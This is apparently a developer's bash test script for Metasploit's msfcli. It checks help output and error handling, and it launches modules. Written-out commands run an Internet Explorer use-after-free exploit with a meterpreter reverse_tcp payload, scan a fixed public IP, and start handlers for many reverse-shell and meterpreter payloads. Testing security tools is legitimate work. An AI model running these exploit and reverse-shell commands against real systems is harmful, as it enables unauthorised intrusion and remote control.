#!/bin/bash

##
#
# Test cases for msfcli
# Before using this, you need to modify your msfcli like to let to automatically exit
# after it's done loading.  At line 341, you should see:
#
# con.run_single("exploit")
#
# Modify that line to:
#
# con.run_single("exploit -j") 
# con.run_single("exit")
#
##

#
# Ask for LHOST
#
printf "[*] Enter LHOST:"
read lhost
if [ "$lhost" = '' ];
then
	echo "[*] I need a LHOST"
	exit
fi

echo "[*] Running test scenarios for msfcli..."

echo "[*] Test 1: I should see a help menu and a list of modules"
time msfcli
echo

echo "[*] Test 2: I should see a help menu"
time msfcli -h
echo

echo "[*] Test 3: I should get an error saying my module is invalid"
time msfcli RANDOMCRAP
echo

echo "[*] Test 4: I should get options for module windows/browser/ie_cbutton_uaf"
time msfcli windows/browser/ie_cbutton_uaf O
echo

echo "[*] Test 5: I should be able to run windows/browser/ie_cbutton_uaf"
time msfcli windows/browser/ie_cbutton_uaf payload=windows/meterpreter/reverse_tcp lhost=$lhost E
echo

echo "[*] Test 6: I should be able to run http_version against metasploit.com (208.118.237.137)"
time msfcli scanner/http/http_version rhosts=208.118.237.137 E
echo

echo "[*] Test 7: I should be able to start a multi/handler with windows/meterpreter/reverse_tcp"
time msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=$lhost E
echo

echo "[*] Test 8: I should be able to start a multi/handler with windows/shell_reverse_tcp"
time msfcli multi/handler payload=windows/shell_reverse_tcp lhost=$lhost E
echo

echo "[*] Test 9: I should be able to start a multi/handler with windows/shell/reverse_tcp"
time msfcli multi/handler payload=windows/shell/reverse_tcp lhost=$lhost E
echo

echo "[*] Test 10: I should be able to start a multi/handler with php/meterpreter/reverse_tcp"
time msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=$lhost E
echo

echo "[*] Test 11: I should be able to start a multi/handler with cmd/unix/generic"
time msfcli multi/handler payload=cmd/unix/generic cmd=id E
echo

echo "[*] Test 12: I should be able to start multi/handler with bsd/x86/exec"
time msfcli multi/handler payload=bsd/x86/exec cmd=id E
echo

echo "[*] Test 13: I should be able to start a multi/handler with java/meterpreter/reverse_tcp"
time msfcli multi/handler payload=java/meterpreter/reverse_tcp lhost=$lhost E
echo

echo "[*] Test 14: I should be able to start a multi/handler with linux/x64/exec"
time msfcli multi/handler payload=linux/x64/exec cmd=id E
echo

echo "[*] Test 15: I should be able to start a multi/handler with linux/x86/meterpreter/reverse_tcp"
time msfcli multi/handler payload=linux/x86/meterpreter/reverse_tcp lhost=$lhost E
echo

echo "[*] Test 16: I should be able to start a multi/handler with linux/x86/shell_reverse_tcp"
time msfcli multi/handler payload=linux/x86/shell_reverse_tcp lhost=$lhost E
echo

echo "[*] Test 17: I should be able to start a multi/handler with windows/x64/shell_reverse_tcp"
time msfcli multi/handler payload=windows/x64/shell_reverse_tcp lhost=$lhost E
echo

echo "[*] Test 18: I should be able to start a multi/handler with windows/meterpreter/reverse_tcp with a x86/fnstenv_mov encoder"
time msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=$lhost encoder=x86/fnstenv_mov E
echo

echo "[*] Test 19: I should get an error saying I have a bad encoder"
time msfcli multi/handler payload=windows/exec cmd=id encoder=BADENCODER E
echo

echo "Done"